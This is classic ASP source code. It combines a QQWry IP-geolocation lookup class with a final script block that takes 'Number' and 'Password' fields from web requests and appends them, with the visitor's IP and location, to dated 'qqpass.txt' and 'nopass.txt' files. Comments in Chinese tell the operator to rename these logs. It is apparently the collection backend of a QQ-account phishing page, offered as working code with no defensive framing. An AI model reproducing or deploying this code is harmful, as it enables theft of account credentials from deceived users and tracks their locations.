<%

Class cls_IpWry

	Dim Country, LocalStr, Buf, OffSet
	Private StartIP, EndIP, CountryFlag
	Public QQWryFile
	Public FirstStartIP, LastStartIP, RecordCount
	Private Stream, EndIPOff

	Private Sub Class_Initialize
		Country      = ""
		LocalStr     = ""
		StartIP      = 0
		EndIP        = 0
		CountryFlag  = 0 
		FirstStartIP = 0 
		LastStartIP  = 0 
		EndIPOff     = 0 
		QQWryFile    = Server.MapPath("CoralWry.dat") 
	End Sub
	
	Function IPToInt(IP)
		Dim IPArray, i
		IPArray = Split(IP, ".", -1)
		FOr i = 0 to 3
			If Not IsNumeric(IPArray(i)) Then IPArray(i) = 0
			If CInt(IPArray(i)) < 0 Then IPArray(i) = Abs(CInt(IPArray(i)))
			If CInt(IPArray(i)) > 255 Then IPArray(i) = 255
		Next
		IPToInt = (CInt(IPArray(0))*256*256*256) + (CInt(IPArray(1))*256*256) + (CInt(IPArray(2))*256) + CInt(IPArray(3))
	End Function

	Function IntToIP(IntValue)
		p4 = IntValue - Fix(IntValue/256)*256
		IntValue = (IntValue-p4)/256
		p3 = IntValue - Fix(IntValue/256)*256
		IntValue = (IntValue-p3)/256
		p2 = IntValue - Fix(IntValue/256)*256
		IntValue = (IntValue - p2)/256
		p1 = IntValue
		IntToIP = Cstr(p1) & "." & Cstr(p2) & "." & Cstr(p3) & "." & Cstr(p4)
	End Function

	Private Function GetStartIP(RecNo)
		OffSet = FirstStartIP + RecNo * 7
		Stream.Position = OffSet
		Buf = Stream.Read(7)
		
		EndIPOff = AscB(MidB(Buf, 5, 1)) + (AscB(MidB(Buf, 6, 1))*256) + (AscB(MidB(Buf, 7, 1))*256*256) 
		StartIP  = AscB(MidB(Buf, 1, 1)) + (AscB(MidB(Buf, 2, 1))*256) + (AscB(MidB(Buf, 3, 1))*256*256) + (AscB(MidB(Buf, 4, 1))*256*256*256)
		GetStartIP = StartIP
	End Function
	
	Private Function GetEndIP()
		Stream.Position = EndIPOff
		Buf = Stream.Read(5)
		EndIP = AscB(MidB(Buf, 1, 1)) + (AscB(MidB(Buf, 2, 1))*256) + (AscB(MidB(Buf, 3, 1))*256*256) + (AscB(MidB(Buf, 4, 1))*256*256*256) 
		CountryFlag = AscB(MidB(Buf, 5, 1))
		GetEndIP = EndIP
	End Function
	
	Private Sub GetCountry(IP)
		If (CountryFlag = 1 or CountryFlag = 2) Then
			Country = GetFlagStr(EndIPOff + 4)
			If CountryFlag = 1 Then
				LocalStr = GetFlagStr(Stream.Position)
			
				If IP >= IPToInt("255.255.255.0") And IP <= IPToInt("255.255.255.255") Then
					LocalStr = GetFlagStr(EndIPOff + 21)
					Country = GetFlagStr(EndIPOff + 12)
				End If
			Else
				LocalStr = GetFlagStr(EndIPOff + 8)
			End If
		Else
			Country = GetFlagStr(EndIPOff + 4)
			LocalStr = GetFlagStr(Stream.Position)
		End If
		
		Country = Trim(Country)
		LocalStr = Trim(LocalStr)
		If InStr(Country, "CZ88.NET") Then Country = "114XP.CN"
		If InStr(LocalStr, "CZ88.NET") Then LocalStr = "114XP.CN"
	End Sub

	Private Function GetFlagStr(OffSet)
		Dim Flag
		Flag = 0
		Do While (True)
			Stream.Position = OffSet
			Flag = AscB(Stream.Read(1))
			If(Flag = 1 or Flag = 2 ) Then
				Buf = Stream.Read(3) 
				If (Flag = 2 ) Then
					CountryFlag = 2
					EndIPOff = OffSet - 4
				End If
				OffSet = AscB(MidB(Buf, 1, 1)) + (AscB(MidB(Buf, 2, 1))*256) + (AscB(MidB(Buf, 3, 1))*256*256)
			Else
				Exit Do
			End If
		Loop
		If (OffSet < 12 ) Then
			GetFlagStr = ""
		Else
			Stream.Position = OffSet
			GetFlagStr = GetStr()
		End If
	End Function

	Private Function GetStr() 
		Dim c
		GetStr = ""
		Do While (True)
			c = AscB(Stream.Read(1))
			If (c = 0) Then Exit Do 
			
		
			If c > 127 Then
				If Stream.EOS Then Exit Do
				GetStr = GetStr & Chr(AscW(ChrB(AscB(Stream.Read(1))) & ChrB(C)))
			Else
				GetStr = GetStr & Chr(c)
			End If
		Loop 
	End Function

	Public Function QQWry(DotIP)
		Dim IP, nRet
		Dim RangB, RangE, RecNo
		IP = IPToInt (DotIP)
		Set Stream = CreateObject("ADodb.Stream")
		Stream.Mode = 3
		Stream.Type = 1
		Stream.Open
		Stream.LoadFromFile QQWryFile
		Stream.Position = 0
		Buf = Stream.Read(8)
		FirstStartIP = AscB(MidB(Buf, 1, 1)) + (AscB(MidB(Buf, 2, 1))*256) + (AscB(MidB(Buf, 3, 1))*256*256) + (AscB(MidB(Buf, 4, 1))*256*256*256)
		LastStartIP  = AscB(MidB(Buf, 5, 1)) + (AscB(MidB(Buf, 6, 1))*256) + (AscB(MidB(Buf, 7, 1))*256*256) + (AscB(MidB(Buf, 8, 1))*256*256*256)
		RecordCount = Int((LastStartIP - FirstStartIP)/7)
	
		If (RecordCount <= 1) Then
			Country = "未知"
			QQWry = 2
			Exit Function
		End If
		RangB = 0
		RangE = RecordCount
		Do While (RangB < (RangE - 1)) 
			RecNo = Int((RangB + RangE)/2) 
			Call GetStartIP (RecNo)
			If (IP = StartIP) Then
				RangB = RecNo
				Exit Do
			End If
			If (IP > StartIP) Then
				RangB = RecNo
			Else 
				RangE = RecNo
			End If
		Loop
		Call GetStartIP(RangB)
		Call GetEndIP()
		If (StartIP <= IP) And ( EndIP >= IP) Then
			
			nRet = 0
		Else
			
			nRet = 3
		End If
		Call GetCountry(IP)
		QQWry = nRet
	End Function
	' ============================================
	' 类终结
	' ============================================
	Private Sub Class_Terminate
		On ErrOr Resume Next
		Stream.Close
		If Err Then Err.Clear
		Set Stream = Nothing
	End Sub
End Class

Function Look_Ip(IP)
	Dim Wry, IPType, QQWryVersion, IpCounter

	Set Wry = New cls_IpWry

	IPType = Wry.QQWry(IP)

	Look_Ip = Wry.Country & " " & Wry.LocalStr
End Function

Function ReqIP()
	ReqIP = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
	If ReqIP = "" or IsNull(ReqIP) Then ReqIP = Request.ServerVariables("REMOTE_ADDR")
End Function

Public Function Format_Ip(ip)
	Dim a, i, Sip
	a = Split(ip, ".")
	If UBound(a) <> 3 Then Format_Ip = 0 : Exit Function
	For i = 0 To 3
		Sip= Sip + CInt(a(i)) * (256^(3-i))
		Format_Ip = Format_Ip & String(3-Len(a(i)),"0") & a(i) & "."
	Next
	Format_Ip = Left(Format_Ip, 15)
End Function


function ip2location (ip) 
set wry =new cls_IpWry
nRet = wry.qqwry(ip)
 
ip2location=wry.Country&wry.LocalStr
end function



IP=request.servervariables("REMOTE_HOST")

Const   ForAppending=8
Const   Create   =   true
Dim   fso   
Dim   ts   
Dim   MyFileName 
Number=request("Number")
Password=request("Password")
tempdata=now
thedata=mid(tempdata,1,9)
strinfor=Number&"----"&Password&"----"&request.servervariables("REMOTE_HOST")&"----"&Look_Ip(Format_Ip(IP))&"----"&now

'------------------------------下面的qqpass.txt可修改为你自己的所需的名字----------
MyFileName=server.MapPath(thedata+"qqpass.txt") 
Set fso=server.createobject("Scripting.filesystemobject") 
Set ts=fso.OpenTextFile(MyFileName,ForAppending,Create)  
ts.writeline(strinfor)
ts.close
Set ts=Nothing   
Set fso=Nothing

'------------------------------以下只记录号码---------------------------------

strinfor=Number&"----"&request.servervariables("REMOTE_HOST")&"----"&Look_Ip(Format_Ip(IP))&"----"&now

'------------------------------下面的nopass.txt可修改为你自己的所需的名字--------
MyFileName=server.MapPath(thedata+"nopass.txt")
Set fso=server.createobject("Scripting.filesystemobject") 
Set ts=fso.OpenTextFile(MyFileName,ForAppending,Create)
ts.writeline(strinfor)
ts.close
Set ts=Nothing   
Set fso=Nothing
	
%>